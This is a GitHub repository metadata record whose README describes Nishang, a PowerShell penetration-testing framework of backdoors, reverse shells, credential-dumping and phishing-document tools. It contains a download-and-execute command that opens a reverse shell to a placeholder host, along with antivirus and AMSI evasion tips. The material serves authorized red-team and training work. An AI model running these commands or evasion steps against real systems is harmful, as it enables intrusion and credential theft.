{
    "https://api.github.com/repos/samratashok/nishang": {
        "forks": 2463,
        "watchers": 8923,
        "stars": 8923,
        "languages": {
            "PowerShell": 6618615,
            "ASP.NET": 10444
        },
        "commits": [
            "2023-02-02T07:56:57Z",
            "2023-02-02T07:55:57Z",
            "2021-07-24T05:49:23Z",
            "2020-10-06T16:14:44Z",
            "2020-02-24T07:48:15Z",
            "2020-02-05T22:38:06Z",
            "2020-01-16T15:24:46Z",
            "2019-11-18T03:57:40Z",
            "2019-11-18T03:57:35Z",
            "2019-07-05T10:24:00Z",
            "2019-07-04T18:02:13Z",
            "2019-05-30T07:34:30Z",
            "2019-04-05T09:53:02Z",
            "2019-03-21T09:27:21Z",
            "2018-11-29T07:15:23Z",
            "2018-11-29T07:15:07Z",
            "2018-11-27T07:55:17Z",
            "2018-11-27T07:54:47Z",
            "2018-11-27T07:22:57Z",
            "2018-11-12T13:57:41Z",
            "2018-11-12T11:27:05Z",
            "2018-11-12T11:21:14Z",
            "2018-11-12T09:22:40Z",
            "2018-11-10T22:04:14Z",
            "2018-11-07T06:20:37Z",
            "2018-11-07T06:10:36Z",
            "2018-11-05T04:24:31Z",
            "2018-09-09T10:04:13Z",
            "2018-09-09T10:02:05Z",
            "2018-09-09T10:01:21Z"
        ],
        "creation_date": "2014-05-19T11:48:24Z",
        "contributors": 11,
        "topics": [
            "activedirectory",
            "hacking",
            "infosec",
            "nishang",
            "penetration-testing",
            "powershell",
            "red-team",
            "redteam",
            "security"
        ],
        "subscribers": 399,
        "readme": "# Nishang\n\n### Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.\nBy [Nikhil Mittal](https://twitter.com/nikhil_mitt)\nFounder of [Altered Security - Hands-on red team and enterprise security training!](https://www.alteredsecurity.com/)\n#### Usage\n\nImport all the scripts in the current PowerShell session (PowerShell v3 onwards).\n\n```powershell\nPS C:\\nishang> Import-Module .\\nishang.psm1\n```\n\nUse the individual scripts with dot sourcing.\n\n```powershell\nPS C:\\nishang> . C:\\nishang\\Gather\\Get-Information.ps1\n\nPS C:\\nishang> Get-Information\n```\n\nTo get help about any script or function, use:\n\n```powershell\nPS C:\\nishang> Get-Help [scriptname] -full\n```\n\nNote that the help is available for the function loaded after running the script and not the script itself since version 0.3.8. In all cases, the function name is same as the script name.\n\nFor example, to see the help about Get-WLAN-Keys.ps1, use\n\n```powershell\nPS C:\\nishang> . C:\\nishang\\Get-WLAN-Keys.ps1\n\nPS C:\\nishang> Get-Help Get-WLAN-Keys -Full\n```\n\n#### Anti Virus\nNishang scripts are flagged by many Anti Viruses as malicious. The scrripts on a target are meant to be used in memory which is very easy to do with PowerShell. Two basic methods to execute PowerShell scripts in memory:\n\nMethod 1. Use the in-memory dowload and execute:\nUse below command to execute a PowerShell script from a remote shell, meterpreter native shell, a web shell etc. and the function exported by it. All the scripts in Nishang export a function with same name in the current PowerShell session.\n\n```powershell\npowershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]\n```\n\nMethod 2. Use the `-encodedcommand` (or `-e`) parameter of PowerShell\nAll the scripts in Nishang export a function with same name in the current PowerShell session. Therefore, make sure the function call is made in the script itself while using encodedcommand parameter from a non-PowerShell shell. For above example, add a function call (without quotes) `\"Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]\"`.\n\nEncode the scrript using Invoke-Encode from Nishang:\n\n```powershell\nPS C:\\nishang> . \\nishang\\Utility\\Invoke-Encode\n\nPS C:\\nishang> Invoke-Encode -DataToEncode C:\\nishang\\Shells\\Invoke-PowerShellTcp.ps1 -OutCommand\n```\n\nEncoded data written to .\\encoded.txt\n\nEncoded command written to .\\encodedcommand.txt\n\nFrom above, use the encoded script from encodedcommand.txt and run it on a target where commands could be executed (a remote shell, meterpreter native shell, a web shell etc.). Use it like below:\n\n```powershell\nC:\\Users\\target> powershell -e [encodedscript]\n```\n\nIf the scripts still get detected changing the function and parameter names and removing the help content will help.\n\nIn case Windows 10's AMSI is still blocking script execution, see this blog: http://www.labofapenetrationtester.com/2016/09/amsi.html\n\n#### Scripts\nNishang currently contains the following scripts and payloads.\n\n#### ActiveDirectory\n[Set-DCShadowPermissions](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1)\n\nModify AD objects to provide minimal permissions required for DCShadow.\n\n#### Antak - the Webshell\n[Antak](https://github.com/samratashok/nishang/tree/master/Antak-WebShell)\n\nExecute PowerShell scripts in memory, run commands, and download and upload files using this webshell.\n\n#### Backdoors\n[HTTP-Backdoor](https://github.com/samratashok/nishang/blob/master/Backdoors/HTTP-Backdoor.ps1)\n\nA backdoor which can receive instructions from third party websites and execute PowerShell scripts in memory.\n\n[DNS_TXT_Pwnage](https://github.com/samratashok/nishang/blob/master/Backdoors/DNS_TXT_Pwnage.ps1)\n\nA backdoor which can receive commands and PowerShell scripts from DNS TXT queries, execute them on a target, and be remotely controlled using the queries.\n\n[Execute-OnTime](https://github.com/samratashok/nishang/blob/master/Backdoors/Execute-OnTime.ps1)\n\nA backdoor which can execute PowerShell scripts at a given time on a target.\n\n[Gupt-Backdoor](https://github.com/samratashok/nishang/blob/master/Backdoors/Gupt-Backdoor.ps1)\n\nA backdoor which can receive commands and scripts from a WLAN SSID without connecting to it. \n\n[Add-ScrnSaveBackdoor](https://github.com/samratashok/nishang/blob/master/Backdoors/Add-ScrnSaveBackdoor.ps1)\n\nA backdoor which can use Windows screen saver for remote command and script execution. \n\n[Invoke-ADSBackdoor](https://github.com/samratashok/nishang/blob/master/Backdoors/Invoke-ADSBackdoor.ps1)\n\nA backdoor which can use alternate data streams and Windows Registry to achieve persistence. \n\n[Add-RegBackdoor](https://github.com/samratashok/nishang/blob/master/Backdoors/Add-RegBackdoor.ps1)\n\nA backdoor which uses well known Debugger trick to execute payload with Sticky keys and Utilman (Windows key + U). \n\n[Set-RemoteWMI](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)\n\nModify permissions of DCOM and WMI namespaces to allow access to a non-admin user. \n\n[Set-RemotePSRemoting](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemotePSRemoting.ps1)\n\nModify permissions of PowerShell remoting to allow access to a non-admin user. \n\n#### Bypass\n[Invoke-AmsiBypass](https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1)\n\nImplementation of publicly known methods to bypass/avoid AMSI.\n\n#### Client\n[Out-CHM](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1)\n\nCreate infected CHM files which can execute PowerShell commands and scripts.\n\n[Out-Word](https://github.com/samratashok/nishang/blob/master/Client/Out-Word.ps1)\n\nCreate Word files and infect existing ones to run PowerShell commands and scripts.\n\n[Out-Excel](https://github.com/samratashok/nishang/blob/master/Client/Out-Excel.ps1)\n\nCreate Excel files and infect existing ones to run PowerShell commands and scripts.\n\n[Out-HTA](https://github.com/samratashok/nishang/blob/master/Client/Out-HTA.ps1)\n\nCreate a HTA file which can be deployed on a web server and used in phishing campaigns. \n\n[Out-Java](https://github.com/samratashok/nishang/blob/master/Client/Out-Java.ps1)\n\nCreate signed JAR files which can be used with applets for script and command execution.\n\n[Out-Shortcut](https://github.com/samratashok/nishang/blob/master/Client/Out-Shortcut.ps1)\n\nCreate shortcut files capable of executing PowerShell commands and scripts.\n\n[Out-WebQuery](https://github.com/samratashok/nishang/blob/master/Client/Out-WebQuery.ps1)\n\nCreate IQY files for phishing credentials and SMB hashes.\n\n[Out-JS](https://github.com/samratashok/nishang/blob/master/Client/Out-JS.ps1)\n\nCreate JS files capable of executing PowerShell commands and scripts.\n\n[Out-SCT](https://github.com/samratashok/nishang/blob/master/Client/Out-SCT.ps1)\n\nCreate SCT files capable of executing PowerShell commands and scripts.\n\n[Out-SCF](https://github.com/samratashok/nishang/blob/master/Client/Out-SCF.ps1)\n\nCreate a SCF file which can be used for capturing NTLM hash challenges. \n\n#### Escalation\n[Enable-DuplicateToken](https://github.com/samratashok/nishang/blob/master/Escalation/Enable-DuplicateToken.ps1)\n\nWhen SYSTEM privileges are required.\n\n[Remove-Update](https://github.com/samratashok/nishang/blob/master/Escalation/Remove-Update.ps1)\n\nIntroduce vulnerabilities by removing patches.\n\n[Invoke-PsUACme](https://github.com/samratashok/nishang/blob/master/Escalation/Invoke-PsUACme.ps1)\n\nBypass UAC.\n\n#### Execution\n[Download-Execute-PS](https://github.com/samratashok/nishang/blob/master/Execution/Download-Execute-PS.ps1)\n\nDownload and execute a PowerShell script in memory.\n\n[Download_Execute](https://github.com/samratashok/nishang/blob/master/Execution/Download_Execute.ps1)\n\nDownload an executable in text format, convert it to an executable, and execute.\n\n[Execute-Command-MSSQL](https://github.com/samratashok/nishang/blob/master/Execution/Execute-Command-MSSQL.ps1)\n\nRun PowerShell commands, native commands, or SQL commands on a MSSQL Server with sufficient privileges.\n\n[Execute-DNSTXT-Code](https://github.com/samratashok/nishang/blob/master/Execution/Execute-DNSTXT-Code.ps1)\n\nExecute shellcode in memory using DNS TXT queries.\n\n[Out-RundllCommand](https://github.com/samratashok/nishang/blob/master/Execution/Out-RundllCommand.ps1)\n\nExecute PowerShell commands and scripts or a reverse PowerShell session using rundll32.exe.\n\n#### Gather\n[Check-VM](https://github.com/samratashok/nishang/blob/master/Gather/Check-VM.ps1)\n\nCheck for a virtual machine.\n\n[Copy-VSS](https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1)\n\nCopy the SAM file using Volume Shadow Copy Service.\n\n[Invoke-CredentialsPhish](https://github.com/samratashok/nishang/blob/master/Gather/Credentials.ps1)\n\nTrick a user into giving credentials in plain text.\n\n[FireBuster](https://github.com/samratashok/nishang/blob/master/Gather/FireBuster.ps1)\n[FireListener](https://github.com/samratashok/nishang/blob/master/Gather/FireListener.ps1)\n\nA pair of scripts for egress testing\n\n[Get-Information](https://github.com/samratashok/nishang/blob/master/Gather/Get-Information.ps1)\n\nGet juicy information from a target.\n\n[Get-LSASecret](https://github.com/samratashok/nishang/blob/master/Gather/Get-LSASecret.ps1)\n\nGet LSA Secret from a target.\n\n[Get-PassHashes](https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1)\n\nGet password hashes from a target.\n\n[Get-WLAN-Keys](https://github.com/samratashok/nishang/blob/master/Gather/Get-WLAN-Keys.ps1)\n\nGet WLAN keys in plain text from a target.\n\n[Keylogger](https://github.com/samratashok/nishang/blob/master/Gather/Keylogger.ps1)\n\nLog keystrokes from a target.\n\n[Invoke-MimikatzWdigestDowngrade](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1)\n\nDump user passwords in plain on Windows 8.1 and Server 2012\n\n[Get-PassHints](https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHints.ps1)\n\nGet password hints of Windows users from a target.\n\n[Show-TargetScreen](https://github.com/samratashok/nishang/blob/master/Gather/Show-TargetScreen.ps1)\n\nConnect back and Stream target screen using MJPEG.\n\n[Invoke-Mimikatz](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1)\n\nLoad mimikatz in memory. Updated and with some customisation.\n\n[Invoke-Mimikittenz](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikittenz.ps1)\n\nExtract juicy information from target process (like browsers) memory using regex.\n\n[Invoke-SSIDExfil](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-SSIDExfil.ps1)\n\nExfiltrate information like user credentials, using WLAN SSID.\n\n[Invoke-SessionGopher](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-SessionGopher.ps1)\n\nIdentify admin jump-boxes and/or computers used to access Unix machines. \n\n\n#### MITM\n[Invoke-Interceptor](https://github.com/samratashok/nishang/blob/master/MITM/Invoke-Interceptor.ps1)\n\nA local HTTPS proxy for MITM attacks.\n\n#### Pivot\n[Create-MultipleSessions](https://github.com/samratashok/nishang/blob/master/Pivot/Create-MultipleSessions.ps1)\n\nCheck credentials on multiple computers and create PSSessions.\n\n[Run-EXEonRemote](https://github.com/samratashok/nishang/blob/master/Pivot/Run-EXEonRemote.ps1)\nCopy and execute an executable on multiple machines.\n\n[Invoke-NetworkRelay](https://github.com/samratashok/nishang/blob/master/Pivot/Invoke-NetworkRelay.ps1)\nCreate network relays between computers.\n\n#### Prasadhak\n[Prasadhak](https://github.com/samratashok/nishang/blob/master/Prasadhak/Prasadhak.ps1)\n\nCheck running hashes of running process against the VirusTotal database.\n\n#### Scan\n[Brute-Force](https://github.com/samratashok/nishang/blob/master/Scan/Brute-Force.ps1)\n\nBrute force FTP, Active Directory, MSSQL, and Sharepoint.\n\n[Port-Scan](https://github.com/samratashok/nishang/blob/master/Scan/Port-Scan.ps1)\n\nA handy port scanner.\n\n#### Powerpreter\n[Powerpreter](https://github.com/samratashok/nishang/tree/master/powerpreter)\n\nAll the functionality of nishang in a single script module.\n\n#### Shells\n[Invoke-PsGcat](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PsGcat.ps1)\n\nSend commands and scripts to specifed Gmail account to be executed by Invoke-PsGcatAgent\n\n[Invoke-PsGcatAgent](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PsGcatAgent.ps1)\n\nExecute commands and scripts sent by Invoke-PsGcat.\n\n[Invoke-PowerShellTcp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)\n\nAn interactive PowerShell reverse connect or bind shell\n\n[Invoke-PowerShellTcpOneLine](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)\n\nStripped down version of Invoke-PowerShellTcp. Also contains, a skeleton version which could fit in two tweets.\n\n[Invoke-PowerShellTcpOneLineBind](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLineBind.ps1)\n\nBind version of Invoke-PowerShellTcpOneLine.\n\n[Invoke-PowerShellUdp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellUdp.ps1)\n\nAn interactive PowerShell reverse connect or bind shell over UDP\n\n[Invoke-PowerShellUdpOneLine](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellUdpOneLine.ps1)\n\nStripped down version of Invoke-PowerShellUdp.\n\n[Invoke-PoshRatHttps](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PoshRatHttps.ps1)\n\nReverse interactive PowerShell over HTTPS.\n\n[Invoke-PoshRatHttp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PoshRatHttp.ps1)\n\nReverse interactive PowerShell over HTTP.\n\n[Remove-PoshRat](https://github.com/samratashok/nishang/blob/master/Shells/Remove-PoshRat.ps1)\n\nClean the system after using Invoke-PoshRatHttps\n\n[Invoke-PowerShellWmi](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellWmi.ps1)\n\nInteractive PowerShell using WMI.\n\n[Invoke-PowerShellIcmp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1)\n\nAn interactive PowerShell reverse shell over ICMP.\n\n[Invoke-JSRatRundll](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-JSRatRundll.ps1)\n\nAn interactive PowerShell reverse shell over HTTP using rundll32.exe.\n\n[Invoke-JSRatRegsvr](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-JSRatRegsvr.ps1)\n\nAn interactive PowerShell reverse shell over HTTP using regsvr32.exe.\n\n\n#### Utility\n[Add-Exfiltration](https://github.com/samratashok/nishang/blob/master/Utility/Add-Exfiltration.ps1)\n\nAdd data exfiltration capability to Gmail, Pastebin, a web server, and DNS to any script.\n\n[Add-Persistence](https://github.com/samratashok/nishang/blob/master/Utility/Add-Persistence.ps1)\n\nAdd reboot persistence capability to a script.\n\n[Remove-Persistence](https://github.com/samratashok/nishang/blob/master/Utility/Remove-Persistence.ps1)\n\nRemote persistence added by the Add-Persistence script.\n\n[Do-Exfiltration](https://github.com/samratashok/nishang/blob/master/Utility/Do-Exfiltration.ps1)\n\nPipe (|) this to any script to exfiltrate the output.\n\n[Download](https://github.com/samratashok/nishang/blob/master/Utility/Download.ps1)\n\nTransfer a file to the target.\n\n[Parse_Keys](https://github.com/samratashok/nishang/blob/master/Utility/Parse_Keys.ps1)\n\nParse keys logged by the keylogger.\n\n[Invoke-Encode](https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Decode.ps1)\n\nEncode and compress a script or string.\n\n[Invoke-Decode](https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Decode.ps1)\n\nDecode and decompress a script or string from Invoke-Encode.\n\n[Start-CaptureServer](https://github.com/samratashok/nishang/blob/master/Utility/Start-CaptureServer.ps1)\n\nRun a web server which logs Basic authentication and SMB hashes.\n\n[ConvertTo-ROT13](https://github.com/samratashok/nishang/blob/master/Utility/ConvertTo-ROT13.ps1)\n\nEncode a string to ROT13 or decode a ROT13 string.\n\n[Out-DnsTxt](https://github.com/samratashok/nishang/blob/master/Utility/Out-DnsTxt.ps1)\n\nGenerate DNS TXT records which could be used with other scripts.\n\n[Base64ToString]\n\n[StringToBase64]\n\n[ExetoText]\n\n[TexttoExe]\n\n\n### Updates\n\nUpdates about Nishang can be found at my blog http://labofapenetrationtester.com and my Twitter feed @nikhil_mitt.\n\n### Bugs, Feedback and Feature Requests\nPlease raise an issue if you encounter a bug or have a feature request. You can email me at nikhil [dot] uitrgpv at gmail.com\n\n#### Mailing List\nFor feedback, discussions, and feature requests, join: http://groups.google.com/group/nishang-users\n\n#### Contributing\nI am always looking for contributors to Nishang. Please submit requests or drop me an email.\n\n#### Blog Posts\n\nSome helpful blog posts to check out for beginners:\n\nhttp://www.labofapenetrationtester.com/2014/06/nishang-0-3-4.html\n\nhttp://labofapenetrationtester.com/2012/08/introducing-nishang-powereshell-for.html\n\nhttp://labofapenetrationtester.com/2013/08/powerpreter-and-nishang-Part-1.html\n\nhttp://www.labofapenetrationtester.com/2013/09/powerpreter-and-nishang-Part-2.html \n\nAll posts about Nishang:\n\nhttp://www.labofapenetrationtester.com/search/label/Nishang\n",
        "releases": [
            {
                "name": "",
                "date": "2017-11-13T05:33:52Z"
            },
            {
                "name": "v0.6.7",
                "date": "2016-05-24T19:13:37Z"
            },
            {
                "name": "Version 0.5.0 ",
                "date": "2015-04-17T13:39:32Z"
            },
            {
                "name": "v0.4.0",
                "date": "2014-11-28T18:14:21Z"
            },
            {
                "name": "v0.3.7",
                "date": "2014-08-31T06:02:47Z"
            },
            {
                "name": "v0.3.5 with Antak Webshell",
                "date": "2014-06-04T05:22:21Z"
            },
            {
                "name": "nishang version 0.3.4",
                "date": "2014-06-02T10:47:15Z"
            }
        ]
    }
}